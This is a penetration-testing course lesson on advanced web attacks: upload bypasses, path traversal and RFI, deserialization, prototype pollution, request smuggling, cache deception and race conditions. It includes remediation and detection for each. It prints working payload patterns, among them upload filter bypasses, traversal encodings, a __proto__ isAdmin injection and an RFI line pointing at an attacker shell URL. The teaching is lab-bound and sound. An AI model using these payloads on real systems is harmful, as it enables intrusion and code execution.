# 07.5 — Advanced web: file upload, path traversal, insecure deserialization, prototype pollution, request smuggling, cache poisoning/deception &amp; race conditions

<div class="prereq">

**Prerequisites:** [00.1 Authorization](../module-00/lesson-01.md), [00.3 Threat modeling](../module-00/lesson-03.md),
[01.2 DNS/HTTP/TLS](../module-01/lesson-02.md) (especially HTTP/1.1 framing and HTTP/2 semantics),
[03 Enumeration](../module-03/lesson-01.md), and Module 07's
[07.1](lesson-01.md)–[07.3](lesson-03.md) plus [07.4](lesson-04.md) — you should already read HTTP
framing, sessions, injection, and the confused-deputy pattern fluently.
**Module:** M07 Web application penetration testing. **Difficulty:** 🔴 advanced.
**You will produce:** a report-ready finding built by **chaining two independent weaknesses** on the
lab app (mirrors Scenario E), with mechanism, verification, impact, remediation, and detection.

</div>

## Why this matters

This lesson is the deep end of web testing: seven vulnerability classes that separate a tester from
a scanner-runner. They are less common than XSS or SQLi but frequently **more severe** — file upload
and deserialization routinely give **remote code execution**; path traversal reads secrets; request
smuggling and cache poisoning weaponize the **infrastructure between** client and app; race
conditions break invariants the developer assumed were atomic. None is reliably found by automated
tools, because each depends on parser quirks, gadget availability, timing, or how two servers
*disagree*. Real high-impact web findings — the ones that make an executive summary — cluster here.
And the finding that ends an engagement is usually a **chain**: a small upload flaw plus a traversal,
a smuggled request plus a cached response. This lesson teaches the mechanisms so you can build those
chains deliberately.

## Learning objectives

- Recognize and safely prove: unrestricted file upload, path traversal / LFI / RFI, insecure
  deserialization (Java/PHP/Python), prototype pollution (Node), HTTP request smuggling (CL.TE /
  TE.CL), web cache poisoning and cache deception, and race conditions (TOCTOU).
- Explain the *mechanism* of each — which parser, which trust assumption, which disagreement — not a
  weaponized chain.
- For each: recognize from behavior → prove safely with inert markers → state impact → remediate →
  detect.
- Chain two independent weaknesses into one demonstrable, report-ready finding.

## Intuition

Group the seven by *what they abuse*. **Trusting a file's claimed identity** — upload bypasses and
traversal both hinge on the server believing a name, extension, or content-type you control.
**Trusting serialized bytes as safe data** — deserialization and prototype pollution both let
attacker-controlled structure change program behavior, not just data. **Two parsers disagreeing** —
request smuggling (front-end vs back-end framing) and cache poisoning/deception (cache vs origin) both
exploit a *gap between components* rather than a single bug. **Trusting that a check and its use are
atomic** — race conditions exploit the window between "check" and "act." Every one is still a
confused deputy or a trust boundary from 00.3; naming the abused assumption tells you how to
recognize, prove, and fix it.

## The underlying technology and each class

### File upload → code execution

An upload feature that lets you place a **server-executable file in a web-reachable, executed
location** yields code execution. Servers decide "is this safe?" using signals you control: the
**extension** (`.php`, `.jsp`, `.aspx`), the **`Content-Type`** header, and sometimes **magic bytes**
(the file's leading signature). Each is bypassable:

- **Extension** blocklist → use an alternate executable extension the server still maps
  (`.phtml`, `.php5`, `.pht`; `.aspx`/`.ashx`), or case/nul/double-extension tricks
  (`shell.php.jpg`, `shell.php%00.jpg` on old stacks, `shell.php.` trailing-dot).
- **`Content-Type`** check → simply set `Content-Type: image/png` on the request; it's client-
  supplied.
- **Magic-byte** check → prepend a valid image header (`GIF89a`) then your code; the file passes the
  signature check and still executes if the extension/handler runs it.

Execution requires the upload to land somewhere the server *executes* (a web root with the handler
enabled) and be reachable by URL. If it lands in a non-executing store, the impact is stored-XSS-via-
SVG, or a chain input rather than direct RCE.

### Path traversal, LFI, RFI

**Path traversal** is supplying `../` sequences (or encodings) in a filename parameter to escape the
intended directory and read/write arbitrary files (CWE-22). **Local File Inclusion (LFI)** is when a
server-side *include*/render takes a user-controlled path and executes/embeds it
(`include($_GET['page'])`), so reading a file can become code execution (log poisoning, PHP wrappers,
uploaded-file inclusion). **Remote File Inclusion (RFI)** is the same include accepting a *remote URL*
(`?page=http://attacker/shell`) — rarer today (defaults disable it) but catastrophic when present.
Recognition: a parameter that names a file/page/template, error messages leaking paths, and behavior
that changes when you feed `../` or an absolute path.

```text
?file=../../../../lab/marker.txt          # traversal read of a lab marker
?file=....//....//lab/marker.txt          # bypass a naive single-pass "../" strip
?file=%2e%2e%2f%2e%2e%2flab/marker.txt    # URL-encoded traversal
```

### Insecure deserialization

Serialization turns objects into bytes; **deserialization** rebuilds them. If an app deserializes
**attacker-controlled** bytes with an unsafe deserializer, the attacker controls the *type and
fields* of reconstructed objects — and in many runtimes, reconstruction triggers code (magic methods,
constructors, callbacks). A **gadget chain** strings together classes already on the classpath so
their side effects during deserialization achieve code execution — the attacker supplies data, the
victim's own code does the work (confused deputy again). By ecosystem:

- **Java** — native serialization (`0xAC 0xED` / base64 `rO0`), `readObject`; gadgets via libraries
  like Commons-Collections. Recognition: `rO0`-prefixed blobs, `Content-Type:
  application/x-java-serialized-object`.
- **PHP** — `unserialize()` on user input; magic methods `__wakeup`/`__destruct`; serialized format
  `O:4:"User":...`. Often reachable via a cookie or hidden field.
- **Python** — `pickle.loads()` on untrusted data; `__reduce__` returns a callable + args executed on
  load. Recognition: pickle opcodes, base64 blobs fed to pickle.

<div class="callout warn">

**Mechanism, not weaponized chains.** This course teaches you to *recognize* a serialized blob, prove
the sink deserializes untrusted input (with a benign, non-destructive probe against the lab), and
explain the gadget concept. It does **not** ship working RCE gadget chains. You demonstrate the
*primitive*, then report it — you do not build a weapon.

</div>

### Prototype pollution (Node.js)

In JavaScript, objects inherit from `Object.prototype`. If code merges attacker-controlled JSON into
an object using a recursive merge/clone that follows the `__proto__` (or `constructor.prototype`)
key, the attacker can **add or change properties on `Object.prototype` itself** — polluting *every*
object in the process (CWE-1321):

```json
{ "__proto__": { "isAdmin": true } }
```

After this merge, an unrelated `({}).isAdmin` is `true`. Impact depends on **gadgets** — code that
later reads a polluted property: an auth check reading `user.isAdmin`, a template engine reading a
polluted option → XSS/SSTI, or a spawned-process option → RCE. Recognition: JSON endpoints that
deep-merge input (config, profile updates), and behavior changes after injecting a `__proto__`
property (a server-side pollution often surfaces as a subtle later change, e.g. a reflected polluted
default).

### HTTP request smuggling (CL.TE / TE.CL)

A front-end (proxy/CDN/load balancer) and a back-end server can **disagree about where one HTTP/1.1
request ends**. Request boundaries are set by either `Content-Length` (CL) or
`Transfer-Encoding: chunked` (TE). If the two servers prioritize different headers, an attacker can
craft a request that the front-end sees as *one* request but the back-end splits into *two* — the
trailing bytes get **prepended to the next user's request**:

```text
CL.TE  → front-end uses Content-Length, back-end uses Transfer-Encoding
TE.CL  → front-end uses Transfer-Encoding, back-end uses Content-Length

  Client ─▶ [ Front-end: "1 request" ]
              │ (boundary disagreement)
              ▼
            [ Back-end: "2 requests" ] ─▶ smuggled bytes prepended to victim's next request
```

Impact: bypassing front-end security controls, capturing other users' requests, request queue
poisoning, and turning a reflected issue into a stored one against arbitrary users. HTTP/2
downgrading (h2 front-end → h1 back-end) reintroduces this via header-injection and length
mismatches. Recognition is **timing- and response-based**: a crafted request that causes a delayed
or desynced response (a differential-timing probe) is the safe detector — you confirm the *desync*,
not by attacking real users.

### Web cache poisoning &amp; cache deception

A shared cache stores a response keyed on some request fields (the **cache key** — typically method +
host + path + a few headers) and serves it to *everyone* whose request matches the key.

- **Cache poisoning** — the attacker gets a **harmful response cached** by influencing an *unkeyed*
  input (a header the origin reflects but the cache ignores, e.g. `X-Forwarded-Host` reflected into a
  link or script src). The poisoned response is then served to all subsequent victims (CWE-524).
- **Cache deception** — the attacker tricks the cache into **storing a victim's private response**
  under a public-looking key, then retrieves it. Classic form: request
  `/account/profile.css` — the origin serves the *profile* (ignoring the fake extension) while the
  cache, seeing `.css`, stores it as a public static asset the attacker can then fetch.

Recognition: cache indicators (`X-Cache: HIT/MISS`, `Age`, `CF-Cache-Status`), a reflected unkeyed
header, and a difference between what the cache keys on and what the origin uses to build the
response.

### Race conditions (TOCTOU)

A **time-of-check-to-time-of-use** race exists when a check (balance ≥ price, coupon unused, one
withdrawal allowed) and the action that relies on it are **not atomic**, and concurrent requests slip
between them. Fire N identical requests in a tight window and several pass the check before any
commits its effect — spending a balance twice, redeeming a single-use coupon many times, exceeding a
limit (CWE-367, "limit overrun"). This is a **business-logic** flaw: the request is legitimate; only
its *concurrency* is abusive. Recognition: any single-use / limited / balance-decrementing operation
without a visible atomic guard (DB transaction, lock, idempotency key).

## Why the weakness exists

File upload/traversal: the app trusts a client-supplied name/type/path (CWE-22, CWE-434).
Deserialization: the app treats serialized bytes as inert data when they encode *behavior*
(CWE-502). Prototype pollution: JavaScript's shared prototype plus a recursive merge that doesn't
exclude special keys (CWE-1321). Smuggling: HTTP/1.1 permits two length mechanisms and RFC 9112 says
reject ambiguous requests, but not all intermediaries do (CWE-444). Cache issues: a mismatch between
the cache key and the inputs that actually determine the response (CWE-524). Races: a non-atomic
check/act sequence under concurrency (CWE-367). Every one is a boundary where a component trusts
something it shouldn't — the through-line of the whole module.

## How a tester recognizes it

- **Upload:** any file input; test extension/type/magic-byte handling and whether the stored file is
  URL-reachable and executed.
- **Traversal/LFI/RFI:** file/page/template parameters; path fragments leaking in errors; behavior
  change on `../`, encodings, absolute paths, `php://`/`data:` wrappers, or a URL value.
- **Deserialization:** serialized blobs in cookies, hidden fields, or bodies (`rO0`, `O:`, pickle
  opcodes; java content-type).
- **Prototype pollution:** JSON endpoints that deep-merge; a later, unrelated behavior change after a
  `__proto__` property.
- **Smuggling:** a front-end/back-end pair (CDN, LB); a timing/desync differential on crafted CL/TE
  requests.
- **Cache:** `X-Cache`/`Age`/`CF-Cache-Status` headers; reflected unkeyed headers; origin ignoring a
  path suffix the cache keys on.
- **Race:** single-use/limited/balance operations lacking an atomic guard.

## Manual investigation

<div class="callout method">

**Prove the primitive minimally, then stop.** Upload the smallest inert marker that proves execution
context (e.g. a file that echoes a `LAB-FLAG` string), not a shell. Read one benign lab marker file
to prove traversal, not `/etc/shadow`. For deserialization, confirm the sink deserializes your input
(a benign type/round-trip probe) before ever discussing gadgets. For prototype pollution, inject a
harmless `__proto__` property and observe a benign reflected default change. For smuggling, use a
**timing differential** against the lab to confirm desync — never a payload that hijacks a real
user's request. For cache, confirm keyed vs unkeyed inputs with a self-targeted marker before any
poisoning. For races, script a small burst of identical requests and observe whether the invariant
breaks. Confirm the mechanism; do not weaponize.

</div>

## Tooling — what it does, key options, limits, verify by hand

- **Burp Repeater** — hand-craft uploads, traversal strings, serialized blobs, and cache probes one
  at a time. *Limit:* single request; no rendering.
- **Burp Intruder / a scripted client** — fuzz extensions, traversal encodings, and header names;
  and, with the **single-packet-attack / last-byte-sync** technique (or HTTP/2), fire the near-
  simultaneous requests a **race condition** needs. *Limit:* timing precision varies with network.
- **Burp "HTTP Request Smuggler" extension / Param Miner** — automate CL.TE/TE.CL desync probes and
  unkeyed-input (cache) discovery. *Limit:* can desync shared infrastructure — **lab only**, and mind
  the RoE even there.
- **ysoserial / ysoserial.net / phpggc (concept)** — gadget-chain generators referenced so you
  *recognize* what a weaponized blob looks like. *Limit/【policy】:* not run to attack; you demonstrate
  the deserialization *primitive* and report, per the safety box above.
- **Browser DevTools** — observe cache headers and prototype-pollution effects client-side. *Limit:*
  server-side pollution needs behavioral inference.

## Exploitation / demonstration (LAB ONLY)

<div class="callout attack">

**File upload bypass → execution (conceptual).** The lab avatar upload blocks `.php` by extension and
checks `Content-Type`. Bypass both, prove execution with an inert marker:

```text
filename="avatar.phtml"        (allowed extension that the handler still executes)
Content-Type: image/png        (client-supplied — passes the type check)
body: GIF89a;<?php echo "LAB-EXEC-OK"; ?>   (magic-byte prefix + inert marker, no shell)
```

Fetch the stored file's URL; if it returns `LAB-EXEC-OK`, code executed in the web root. The marker
proves the mechanism without a shell or any destructive action.

</div>

<div class="callout attack">

**Path traversal read.** A `?file=` download parameter:

```text
GET /download?file=../../../../lab/marker.txt      → returns the lab marker's contents
GET /download?file=....//....//lab/marker.txt       → bypasses a naive one-pass "../" filter
```

Retrieving the benign lab marker proves arbitrary read; you do **not** exfiltrate real secrets.

</div>

<div class="callout attack">

**Prototype pollution.** A profile-update JSON endpoint deep-merges input:

```json
{ "name": "lab", "__proto__": { "labPolluted": "LAB-PP-OK" } }
```

After the merge, a later response that reads a default from a fresh object reflects `LAB-PP-OK` —
proving `Object.prototype` was polluted. The inert marker property demonstrates the mechanism; the
real-world gadget (an auth `isAdmin`, a template option) is described, not fired.

</div>

<div class="callout attack">

**Request smuggling — desync confirmation (CL.TE).** Against the lab front-end/back-end pair, a
crafted request whose `Content-Length` and `Transfer-Encoding: chunked` disagree causes the back-end
to wait for bytes the front-end already considers "next request" — observable as a **delayed
response** on the follow-up. You confirm the *desync via timing*, log it, and stop; you do not
prepend bytes to another user's request.

</div>

<div class="callout attack">

**Cache deception.** Request your own authenticated page with a static-looking suffix the cache keys
on but the origin ignores:

```text
GET /account/profile.css HTTP/1.1     → origin serves your profile; cache stores it as ".css"
```

Confirm with `X-Cache: MISS` then `HIT`; the mechanism is proven by observing your *own* private data
cached under a public key on the lab. You do not retrieve another real user's data.

</div>

<div class="callout attack">

**Race condition (TOCTOU).** The lab "redeem one-time coupon" endpoint checks "unused?" then credits.
Fire 20 identical redemptions in a single-packet burst; several pass the check before any commits,
crediting the coupon multiple times. The limited resource here is a synthetic lab balance — proving
the invariant break, not stealing value.

</div>

<div class="callout legal">

**LAB TARGET vs REAL SYSTEM.** Every demonstration targets `labs/lab-07-web` on the isolated network,
uses inert markers (`LAB-EXEC-OK`, `LAB-PP-OK`, `LAB-FLAG-{uuid}`, synthetic balances) and lab marker
files, and confirms mechanisms (execution, read, pollution, desync, cache, race) **without**
weaponized gadget chains, real exfiltration, real-user request hijacking, or destructive effects.
Running any of this against a system you do not own and are not explicitly authorized to test is a
crime (00.1). Smuggling and cache probes can disrupt *shared* infrastructure — keep them in the lab.

</div>

## Verification

Each class has a specific, non-destructive proof: **upload** — the stored URL returns your inert
marker (execution) or the file is served with an active handler; **traversal** — the response body is
the lab marker file's contents; **deserialization** — a benign probe object round-trips / the sink
demonstrably parses your bytes (you report the primitive, not an RCE); **prototype pollution** — a
fresh object reflects your injected marker property; **smuggling** — a reproducible timing/desync
differential logged from Repeater; **cache** — `X-Cache` transitions from `MISS` to `HIT` for the
poisoned/deceived response on the lab; **race** — the invariant broke (balance/coupon used more than
allowed) under a concurrent burst and holds under sequential requests. Capture the request(s),
response(s), and the specific artifact for each.

## Impact

<div class="callout key">

- **File upload / LFI / RFI** → remote code execution on the web server (often the highest-severity
  single web finding) → full app/host compromise.
- **Path traversal** → arbitrary file read (config, secrets, source) or write; a strong chain input.
- **Deserialization** → remote code execution via a gadget chain; among the most severe web classes.
- **Prototype pollution** → depending on gadget: auth bypass, DoS, client/server XSS/SSTI, or RCE.
- **Request smuggling** → security-control bypass, cross-user request/response capture, mass credential
  or session theft, cache poisoning at scale.
- **Cache poisoning** → a stored attack served to *every* subsequent user (mass XSS/redirect);
  **cache deception** → theft of other users' private responses.
- **Race conditions** → business-logic breakage: double-spend, limit/coupon abuse, over-withdrawal.

</div>

## Remediation

<div class="callout defend">

- **Upload:** validate with an **allowlist** of extensions/types, re-encode/rename files, store
  **outside the web root** or on a non-executing store/CDN, disable script execution in the upload
  directory, and verify content server-side (not the client `Content-Type`).
- **Traversal/LFI/RFI:** never build filesystem paths or includes from user input; use an allowlist/
  ID→path map; canonicalize and confine to a base dir; disable remote includes and dangerous wrappers.
- **Deserialization:** don't deserialize untrusted input; if unavoidable, use safe formats
  (JSON with a schema), signed/encrypted payloads, and deserialization allowlists/look-ahead
  (e.g. Java `ObjectInputFilter`).
- **Prototype pollution:** reject/strip `__proto__`/`constructor`/`prototype` keys; use `Map`,
  `Object.create(null)`, `Object.freeze(Object.prototype)`, or safe-merge libraries; validate JSON
  against a schema.
- **Smuggling:** use HTTP/2 end-to-end where possible; ensure front-end and back-end agree on framing;
  reject ambiguous CL+TE requests (RFC 9112); normalize/close on malformed length headers.
- **Cache:** exclude authenticated/dynamic responses from shared caches (`Cache-Control:
  private/no-store`); key on all inputs that affect the response or strip unkeyed ones at the edge;
  don't let path suffixes change caching without changing the response.
- **Races:** make check-and-act atomic — DB transactions with row locks, unique constraints,
  idempotency keys, or atomic decrements; don't rely on read-then-write.

</div>

## Detection / blue-team view

<div class="callout defend">

- **Upload/traversal:** WAF/log signatures for `../`, encoded traversal, and executable extensions on
  upload endpoints; alert on new executable files in web roots (file-integrity monitoring); requests
  to uploaded files with script extensions.
- **Deserialization:** serialized magic bytes (`rO0`, `AC ED`, `O:`, pickle opcodes) in requests;
  child-process spawns from app runtimes.
- **Prototype pollution:** `__proto__`/`constructor` keys in JSON bodies; anomalous behavior changes.
- **Smuggling:** malformed/ambiguous length headers at the edge; desync anomalies; unexpected
  responses attributed to the wrong user.
- **Cache:** monitoring for reflected unkeyed headers and unexpected `HIT`s on authenticated paths.
- **Races:** bursts of near-simultaneous identical requests to a limited-resource endpoint; invariant
  violations in business metrics.

Mapped to **MITRE ATT&CK**: upload/deserialization RCE aligns with **T1190** (Exploit Public-Facing
Application); web shells with **T1505.003**. The blue-team through-line: *watch the boundary each
class abuses — the web root, the parser input, the framing, the cache key, the concurrency window.*

</div>

## Practical lab

<div class="lab">

**Environment:** `labs/lab-07-web` (built separately) — the intentionally vulnerable web app suite on
the isolated Docker network, deployed **behind a front-end proxy** (for smuggling/cache work) with an
upload store, a file-download endpoint, a Node JSON API (prototype pollution), a deserialization
sink, and a limited-resource endpoint (race). **Access:** `lab / Lab-Passw0rd!`. **Targets:** lab
hosts only; inert markers (`LAB-EXEC-OK`, `LAB-PP-OK`, `LAB-FLAG-{uuid}`) and synthetic balances.
**Time:** ~150 min. **Isolation:** private network, no Internet route; reset per the lab README —
especially after smuggling/cache tests, which leave desynced or poisoned state.

</div>

Prove each class once against the lab with an inert marker, then attempt the chain in the exercise.

## Exercise

<div class="callout method">

**Situation.** Authorized web test of the lab app (Scenario E — "web + infrastructure chain"). You
hold the `lab` account. The client wants proof of *real* impact, and understands that a single
low-severity issue may be far worse when combined with another.

**Objective.** **Chain two independent weaknesses** from this lesson (or one from 07.4 plus one from
here) into a single demonstrable impact — e.g. a file-upload that only becomes RCE once a path
traversal or a permissive handler is combined with it; a prototype pollution that turns a benign
template into XSS/SSTI; a cache deception that captures a response made sensitive by another flaw; a
race that multiplies the effect of a logic bug. The two weaknesses must be **independent** (neither is
just a step of the other), and the deliverable is a **report-ready finding**.

**Starting information.** The `lab` account and the lab endpoints. No pre-built exploit or gadget.

**Constraints.** Lab target only. Inert markers only — no weaponized gadget chains, no real
exfiltration, no real-user request hijacking, no destructive effect. Smuggling/cache/race tests only
against the lab; reset afterward. You must explain the **mechanism** of *each* weakness and *why the
chain works* — the trust boundary each crosses.

**Expected deliverables.**
1. The **two weaknesses**, each with its class, mechanism (parser/trust assumption), and independent
   proof.
2. The **chain**: how weakness A enables or amplifies weakness B, and the combined impact in client
   terms.
3. **Verification evidence** for each step (requests/responses/markers).
4. **Remediation** and **detection** for both weaknesses, and a note on which fix breaks the chain
   most cheaply.

</div>

<details><summary>Hint 1 — conceptual direction</summary>
A chain is "weakness A produces a capability that weakness B needs." Ask of each flaw you find: what
does it <em>give</em> me (a file on disk? an arbitrary read? a polluted default? a cached response?),
and which other flaw <em>consumes</em> that capability?
</details>

<details><summary>Hint 2 — pairings that compose</summary>
Upload-to-a-non-executing-store + path traversal or an LFI that includes it → execution. Prototype
pollution + a template/option gadget → XSS/SSTI or config change. Cache deception + any endpoint that
reflects a session marker → theft. A logic bug + a race → multiplied effect.
</details>

<details><summary>Hint 3 — where to look</summary>
Inventory every file input, file/page parameter, JSON deep-merge endpoint, serialized blob, cache
header, and limited-resource action first (07.1–07.3 surface mapping). The chain usually connects two
things you already listed separately.
</details>

<details><summary>Hint 4 — proving the chain safely</summary>
Prove each weakness with its inert marker independently, then show the marker from A being consumed by
B (e.g. the uploaded <code>LAB-EXEC-OK</code> file reached via the traversal path). The chain is
proven by the composed markers, never by a real payload.
</details>

## Check yourself

<div class="callout key">

1. An upload lands your file in a store that does **not** execute scripts. Is the upload worthless? Name
   two ways it can still matter, and one second weakness that would turn it into RCE.
2. A single-pass filter removes `../` from the input. Why does `....//` defeat it, and what does that
   tell you about *where* path canonicalization must happen?
3. You inject `{"__proto__":{"isAdmin":true}}` and nothing visibly changes. Why might the pollution
   still have succeeded, and how would you confirm it without a visible gadget?
4. In CL.TE smuggling, which server honours `Content-Length` and which honours `Transfer-Encoding`,
   and why does that specific disagreement let bytes "leak" into the next request?
5. Cache **poisoning** and cache **deception** both involve a shared cache. In one sentence each,
   state whose data ends up where in each — and why that difference changes who the victim is.
6. A withdrawal endpoint checks the balance then debits, with no transaction. Why does firing 20
   simultaneous requests over-withdraw, and which single remediation most directly closes it?

</div>

Model answers are in `solutions/module-07-part2.md` (try them before looking).

## References

- **OWASP WSTG** — Upload of Malicious Files (4.10.9), Testing for Path Traversal / LFI-RFI (4.5.5),
  Testing for Deserialization (4.7.x), HTTP Request Smuggling (4.2.6), Testing for HTTP Splitting/
  Smuggling, Web Cache Deception/Poisoning, Testing for Race Conditions (business logic).
- **OWASP Cheat Sheets** — File Upload, Deserialization, Mass Assignment, Node.js Security (prototype
  pollution).
- **CWE** — CWE-434 (upload), CWE-22 (traversal), CWE-98 (RFI/LFI), CWE-502 (deserialization),
  CWE-1321 (prototype pollution), CWE-444 (request smuggling / HTTP request/response desync),
  CWE-524 (cache), CWE-367 (TOCTOU race).
- **PortSwigger Research** — HTTP request smuggling (Kettle), HTTP/2 desync and "Browser-powered
  desync," Web cache poisoning and Web cache deception, Smashing the state machine (race conditions,
  single-packet attack), Server-side prototype pollution.
- **RFC 9112** (HTTP/1.1 message framing — ambiguous length handling) and **RFC 9110** (HTTP
  semantics); **RFC 9111** (HTTP caching).
- **MITRE ATT&CK** — **T1190** Exploit Public-Facing Application; **T1505.003** Web Shell.

## What you should now be able to do

- Recognize file upload, path traversal/LFI/RFI, insecure deserialization, prototype pollution,
  request smuggling, cache poisoning/deception, and race conditions from behavior.
- Prove each safely with an inert marker and explain the abused trust boundary — without weaponizing.
- State the impact, remediation, and detection for each class.
- Chain two independent weaknesses into a single, report-ready, demonstrably-impactful finding.

## Progress checkpoint

```bash
py course.py complete 07.5
```
